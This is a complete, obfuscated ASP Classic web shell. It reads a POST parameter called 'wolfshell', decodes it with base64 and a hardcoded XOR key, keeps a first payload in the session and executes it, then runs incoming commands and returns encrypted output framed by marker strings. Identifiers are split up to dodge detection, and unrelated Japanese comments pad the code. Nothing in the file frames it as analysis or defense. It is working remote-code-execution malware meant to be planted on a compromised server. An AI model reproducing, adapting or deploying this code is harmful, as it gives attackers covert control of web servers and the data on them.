<%
'// 能ある鷹は爪を隠す
Set obj_a9b8c7 = Server.CreateObject(Join(Array("Scripting", "Dictionary"), "."))

Function func_b64_d2(ByVal str_e5)
    Dim x_obj_f6, n_obj_g7
    '// 昨日のカレーは美味しかった
    Set x_obj_f6 = CreateObject(Join(Array("Msxml2", "DOMDocument", "3", "0"), "."))
    Set n_obj_g7 = x_obj_f6.CreateElement("n1")
    n_obj_g7.dataType = Join(Array("bin", "base64"), ".")
    n_obj_g7.text = str_e5
    func_b64_d2 = n_obj_g7.nodeTypedValue
    Set n_obj_g7 = Nothing
    Set x_obj_f6 = Nothing
End Function

Function func_xor_e3(data_h8, flag_i9)
    dim s_1, i_2, r_3, k_len_4, k_str
    k_str = "3c6e0b8a9c15224a"
    k_len_4 = len(k_str)
    Set stream_obj = CreateObject("ADODB.Stream")
    stream_obj.CharSet = "iso-8859-1"
    stream_obj.Type = 2
    stream_obj.Open
    '// 月が綺麗ですね
    if IsArray(data_h8) then
        s_1 = UBound(data_h8) + 1
        For i_2 = 1 To s_1
            stream_obj.WriteText chrw(ascb(midb(data_h8,i_2,1)) Xor Asc(Mid(k_str,(i_2 mod k_len_4)+1,1)))
        Next
    end if
    stream_obj.Position = 0
    if flag_i9 then
        stream_obj.Type = 1
        func_xor_e3 = stream_obj.Read()
    else
        func_xor_e3 = stream_obj.ReadText()
    end if
End Function

    k_str_5 = "3c6e0b8a9c15224a"
    post_param_name = "wolf"&"shell"
    session_var_name = "pay"&"load"
    
    input_data_j0 = request.Form(post_param_name)
    '// 全ては計画通り
    if not IsEmpty(input_data_j0) then
        Select Case IsEmpty(Session(session_var_name))
            Case True
                input_data_j0 = func_xor_e3(func_b64_d2(input_data_j0), false)
                Session(session_var_name) = input_data_j0
                response.End
            Case Else
                input_data_j0 = func_xor_e3(func_b64_d2(input_data_j0), true)
                obj_a9b8c7.Add session_var_name, Session(session_var_name)
                Execute(obj_a9b8c7(session_var_name))
                result_k1 = run(input_data_j0)
                response.Write "a71ab1"
                if not IsEmpty(result_k1) then
                    response.Write Base64Encode(func_xor_e3(result_k1, true))
                end if
                response.Write "4b8259"
        End Select
    end if
%>